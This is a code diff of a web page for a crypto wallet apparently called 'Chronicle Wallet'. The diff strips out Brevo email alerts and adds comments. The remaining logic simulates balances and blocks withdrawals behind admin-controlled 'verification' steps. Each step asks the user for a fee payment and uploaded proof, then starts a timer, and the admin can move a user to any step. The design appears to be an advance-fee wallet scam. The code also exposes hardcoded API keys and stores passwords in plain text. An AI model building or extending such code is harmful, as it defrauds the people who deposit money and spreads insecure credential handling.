@@ -723,56 +723,6 @@
     </div>
 
     <script>
-        // --- EMBEDDED BREVO EMAIL ENGINE (Directly inside HTML script) ---
-        const BREVO_API_KEY = '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';
-        const SENDER_EMAIL = 'support@chroniclewallet.com';
-        const SENDER_NAME = 'Chronicle Wallet';
-
-        async function sendBrevoEmail(toEmail, toName, subject, htmlBody) {
-            console.log("Sending Brevo email to:", toEmail);
-            try {
-                const response = await fetch('https://api.brevo.com/v3/smtp/email', {
-                    method: 'POST',
-                    headers: { 'accept': 'application/json', 'api-key': BREVO_API_KEY, 'content-type': 'application/json' },
-                    body: JSON.stringify({
-                        sender: { name: SENDER_NAME, email: SENDER_EMAIL },
-                        to: [{ email: toEmail, name: toName }],
-                        subject: subject,
-                        htmlContent: `<html><body>${htmlBody}</body></html>`
-                    })
-                });
-                const data = await response.json();
-                console.log("Brevo API Response Status:", response.status, data);
-                if (!response.ok) {
-                    console.error("Brevo Error Message:", data.message || data);
-                }
-            } catch (err) {
-                console.error("Brevo Email Fetch Error:", err);
-            }
-        }
-
-        function sendWelcomeAlert(email, name) {
-            sendBrevoEmail(email, name, "Welcome to Chronicle Wallet!", `<h2>Welcome ${name}!</h2><p>Your account was created successfully. Your secure Web3 wallet vault is ready.</p>`);
-        }
-        function sendWithdrawalAlert(email, name, amt, dest, stage, note) {
-            sendBrevoEmail(email, name, `Withdrawal Update: ${stage}`, `<h3>Withdrawal Processing Update</h3><p>Amount: $${amt}</p><p>Method: ${dest}</p><p>Current Stage: <strong>${stage}</strong></p><p>${note}</p>`);
-        }
-        function sendProofSubmittedAlert(email, name, title, amt) {
-            sendBrevoEmail(email, name, `Proof Submitted: ${title}`, `<h3>Payment Proof Submitted</h3><p>Your proof for <strong>${title}</strong> ($${amt}) has been uploaded and is pending admin review.</p>`);
-        }
-        function sendProofApprovedAlert(email, name, title) {
-            sendBrevoEmail(email, name, `Proof Approved: ${title}`, `<h3>Verification Step Cleared</h3><p>Your payment proof for <strong>${title}</strong> has been approved by admin!</p>`);
-        }
-        function sendTransferSentAlert(email, name, amt, recipient, txId) {
-            sendBrevoEmail(email, name, `Debit Alert: Sent $${amt}`, `<h3>Debit Alert</h3><p>Successfully sent $${amt} to User ID: ${recipient}.</p><p>Reference: ${txId}</p>`);
-        }
-        function sendTransferReceivedAlert(email, name, amt, sender, txId) {
-            sendBrevoEmail(email, name, `Credit Alert: Received $${amt}`, `<h3>Credit Alert</h3><p>You received $${amt} from User ID: ${sender}.</p><p>Reference: ${txId}</p>`);
-        }
-        function sendCoinSoldAlert(email, name, amt, coin, fiat) {
-            sendBrevoEmail(email, name, `Coin Sale Confirmed`, `<h3>Asset Conversion Successful</h3><p>Sold ${amt} ${coin} for $${fiat.toFixed(2)} USD cash.</p>`);
-        }
-
         // --- YOUR FIREBASE CONFIGURATION ---
         const firebaseConfig = {
             apiKey: "AIzaSyB0gvtPHOL5RMcGOzUStFh5_83AQsXi8DY",
@@ -886,6 +836,7 @@
                     u.statusExpiryTime = null;
                     const tx = (u.txs || []).find(t => t.id == u.activeTxId);
                     
+                    // After timer expires, move to NEXT step or complete
                     u.stepIdx = (u.stepIdx || 0) + 1;
                     if (u.stepIdx < actionSteps.length) {
                         const nextStep = actionSteps[u.stepIdx];
@@ -983,7 +934,7 @@
                 guestPrompt.classList.remove('hidden');
                 dashboard.classList.add('hidden');
                 txCard.classList.add('hidden');
-                usdRow.classList.remove('hidden');
+                usdRow.classList.remove('hidden'); // Always visible to display direct USD currency
 
                 document.getElementById('btc-holdings-display').innerText = `0.0000 BTC`;
                 document.getElementById('btc-fiat-value').innerText = `$0.00`;
@@ -1128,16 +1079,10 @@
                 recipientUser.usd += deductUsd;
             }
 
-            const txRef = 'TX-' + Date.now();
             u.txs.unshift({ type: `Send (${asset.toUpperCase()})`, amount: fiatVal, status: 'COMPLETED' });
             recipientUser.txs.unshift({ type: `Receive (${asset.toUpperCase()})`, amount: fiatVal, status: 'COMPLETED' });
             
             sendSimulatedEmail(recipientUser.email, `Incoming Transfer`, `Received ${asset.toUpperCase()} transfer from ${u.name || u.email} (ID: ${u.userId})`, `💸 Received from ${u.name || u.email}!`);
-            
-            // Trigger Brevo Email APIs
-            sendTransferSentAlert(currentUserEmail, u.name || currentUserEmail, fiatVal, recipientId, txRef);
-            sendTransferReceivedAlert(recipientUser.email, recipientUser.name || recipientUser.email, fiatVal, u.userId, txRef);
-
             saveState(); updateBalanceUI(); closeSendModal();
             showNotification("Transfer Sent", `Successfully sent to ${recipientUser.name || recipientId}`, "↗");
         }
@@ -1156,10 +1101,6 @@
             if (asset === 'btc') u.btc -= amt; else u.eth -= amt;
             u.usd += fiatGain;
             u.txs.unshift({ type: `Sell (${asset.toUpperCase()})`, amount: fiatGain, status: 'COMPLETED' });
-            
-            // Trigger Brevo Email API
-            sendCoinSoldAlert(currentUserEmail, u.name || currentUserEmail, amt, asset.toUpperCase(), fiatGain);
-
             saveState(); updateBalanceUI(); closeSellModal();
             showNotification("Sold", `Converted to $${fiatGain.toFixed(2)} USD`, "📉");
         }
@@ -1221,10 +1162,6 @@
             const firstStep = actionSteps.length > 0 ? actionSteps[0] : { title: "ACTIVATING", amount: 0, statusMsg: "Processing" };
 
             u.txs.unshift({ id: txId, type: `Withdraw (${selectedWithdrawMethodName})`, amount: amt, baseWithdraw: amt, status: `PENDING (${firstStep.title.toUpperCase()})` });
-            
-            // Trigger Brevo Email API
-            sendWithdrawalAlert(currentUserEmail, u.name || currentUserEmail, amt, selectedWithdrawMethodName, firstStep.title, firstStep.note || 'Please complete verification.');
-
             saveState(); updateBalanceUI();
             showNotification("Processing", `Withdrawal request submitted`, "💳");
             setTimeout(() => { openActionModal(); }, 1500);
@@ -1311,9 +1248,6 @@
                     const tx = u.txs.find(t => t.id == u.activeTxId);
                     if (tx) tx.status = `PROOF SUBMITTED (PENDING ADMIN REVIEW)`;
 
-                    // Trigger Brevo Email API
-                    sendProofSubmittedAlert(currentUserEmail, u.name || currentUserEmail, step.title, step.amount);
-
                     db.collection("config").doc("appData").set({
                         usersList: usersList,
                         proofQueue: proofQueue,
@@ -1377,6 +1311,7 @@
             if (pendingSaves === 0) { saveState(); alert("Global addresses updated!"); }
         }
 
+        // --- ADMIN MANUAL USER OVERRIDE FUNCTION ---
         function adminManualOverrideUser(e) {
             e.preventDefault();
             const email = document.getElementById('admin-override-user').value;
@@ -1397,9 +1332,6 @@
                 targetUser.stepIdx = newStepIdx;
                 if (tx && actionSteps[newStepIdx]) {
                     tx.status = `PENDING (${actionSteps[newStepIdx].title.toUpperCase()})`;
-                    
-                    // Trigger Brevo Email API
-                    sendWithdrawalAlert(targetUser.email, targetUser.name || targetUser.email, tx.amount, 'External Account', actionSteps[newStepIdx].title, actionSteps[newStepIdx].note || 'Please check dashboard.');
                 }
                 alert(`Successfully updated ${email}'s current step index to ${newStepIdx}`);
             }
@@ -1624,6 +1556,7 @@
         }
         function deleteActionStep(id) { actionSteps = actionSteps.filter(x => x.id != id); saveState(); }
 
+        // --- CORRECTED ADMIN APPROVAL FLOW: SETS ASSIGNED STATUS & STARTS TIMER ---
         function approveProof(proofId) {
             const pIndex = proofQueue.findIndex(x => x.id == proofId);
             if (pIndex === -1) return;
@@ -1635,14 +1568,13 @@
                 const tx = u.txs.find(t => t.id == u.activeTxId);
                 const step = actionSteps[p.stepIdx];
                 if (tx && step) {
+                    // 1. Add approved fee amount to pending transaction total
                     tx.amount += step.amount;
+
+                    // 2. Set status to the assigned status message (e.g. Activating) and start the countdown timer
                     tx.status = step.statusMsg.toUpperCase();
                     u.statusExpiryTime = Date.now() + ((step.timerMinutes || 2) * 60 * 1000);
                 }
-
-                // Trigger Brevo Email API
-                sendProofApprovedAlert(u.email, u.name || u.email, step.title);
-
                 alert(`Proof approved for ${p.user}. Status set to "${step.statusMsg}" for ${step.timerMinutes} minute(s).`);
             }
             saveState();
@@ -1823,10 +1755,6 @@
             const newUser = { name, email, userId: uniqueId, password, pin: null, btc: 0, eth: 0, usd: 0, txs: [], stepIdx: 0, activeTxId: null, statusExpiryTime: null };
             usersList.push(newUser);
             currentUserEmail = email;
-
-            // Trigger Brevo Welcome Email
-            sendWelcomeAlert(email, name);
-
             saveState();
             closeAuthModal();
             updateBalanceUI();
@@ -1893,7 +1821,7 @@
         }
 
         updateBalanceUI();
-        updateSupportAgentUI();   
+        updateSupportAgentUI();
     </script>
 </body>
 </html>
